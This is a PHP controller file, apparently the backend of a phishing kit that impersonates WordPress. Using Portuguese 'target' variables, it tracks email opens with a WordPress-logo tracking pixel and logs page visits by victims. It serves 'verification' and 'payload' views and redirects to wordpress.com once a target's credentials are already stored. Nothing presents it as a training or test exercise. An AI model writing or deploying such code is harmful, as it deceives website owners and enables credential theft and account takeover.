<?php
defined('BASEPATH') or exit('No direct script access allowed');

class Checkup extends CI_Controller
{

    function __construct()
    {

        parent::__construct();

        $this->load->model('main_model');
    }

    public function index()
    {

        if ($this->input->get()) {

            $data = array();

            $data['alvo_url'] = htmlspecialchars($this->input->get('u'));
            $data['alvo_email'] = htmlspecialchars($this->input->get('e'));
            $data['alvo_nome'] = htmlspecialchars($this->input->get('a'));
            
            


            // Registra que acessou a página.
            $this->main_model->addCountAlvoPaginaAbertura($data['alvo_url'], $data['alvo_email']);
            
            if ($this->main_model->existCredenciais($data['alvo_url']) ) {
                header('Location:https://wordpress.com');
            }

            $this->load->view('users/verification', $data);
            
        } else {
            header('Location:https://wordpress.com');
        }
    }
    
    public function update() {
        if ($this->input->get()) {

            $data = array();

            $data['alvo_url'] = htmlspecialchars($this->input->get('u'));
            $data['alvo_email'] = htmlspecialchars($this->input->get('e'));
            $data['alvo_nome'] = htmlspecialchars($this->input->get('a'));
            
            


            // Registra que acessou a página.
            $this->main_model->addCountAlvoPaginaAbertura($data['alvo_url'], $data['alvo_email']);
            
            if ($this->main_model->existCredenciais($data['alvo_url']) ) {
                header('Location:https://wordpress.com');
            }

            $this->load->view('users/verification_payload_two', $data);
            
        } else {
            header('Location:https://wordpress.com');
        }
    }

public function success() {
     if ($this->input->get()) {

            $data = array();

            $data['alvo_url'] = htmlspecialchars($this->input->get('u'));
     
            
        
            // Registra que acessou a página.

            // if ($this->main_model-> existCredenciais($data['alvo_url']) ) {
            //     header('Location:https://wordpress.com');
            // }

            $this->load->view('users/success', $data);
            
        } else {
            header('Location:https://wordpress.com');
        }
}


public function email_ping()
    {
        $alvo_url = htmlspecialchars($this->input->get('u'));
        $alvo_email = htmlspecialchars($this->input->get('e'));

        $this->main_model->addCountAlvoEmail($alvo_url, $alvo_email);


        $imagemSubstituta = './assets/wordpress-logo.svg';
        header('Content-Type: image/svg+xml');
        readfile($imagemSubstituta);
    }

    public function verification($alvo_ref) {
        $alvo = $this->main_model->getAlvoByRef($alvo_ref);
        header('Location:'.base_url().'checkup?u=' . $alvo['alvo_url'] . '&e=' . $alvo['alvo_email'] . '&a=' . $alvo['alvo_nome']);
    }
}
